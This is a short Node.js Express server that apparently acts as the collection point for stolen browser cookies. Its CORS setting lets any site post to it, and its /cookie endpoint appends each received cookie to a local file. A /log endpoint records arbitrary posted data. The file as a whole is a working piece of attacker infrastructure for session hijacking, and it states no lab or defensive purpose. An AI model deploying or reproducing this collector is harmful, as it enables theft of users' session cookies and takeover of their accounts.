'use strict';

//modules
var fs = require('fs');

// setup express
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cors = require('cors');
const port = process.env.PORT || 3000;

// packages for express
app.use( bodyParser.json() );       // to support JSON-encoded bodies
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
 extended: true})); 
app.use(cors());

var cookieFunc = function(cookie){
    fs.appendFile('cookies.txt', cookie, function (err){
        if(err) throw err;
        console.log("Saved cookie " + cookie + " to file.");
    });
}

app.get('/', (req, res)=>{
    res.sendFile('./index.html', { root : __dirname});
});

app.post('/cookie', (req, res)=>{
    cookieFunc(req.body.cookie);
    res.send('<h1>Posted!</h1>');
});

app.post('/log', (req, res)=>{
    console.log(req.body.log);
    res.sendStatus(200);
});

app.listen(port, ()=>{
    console.log("Running on " + port);
})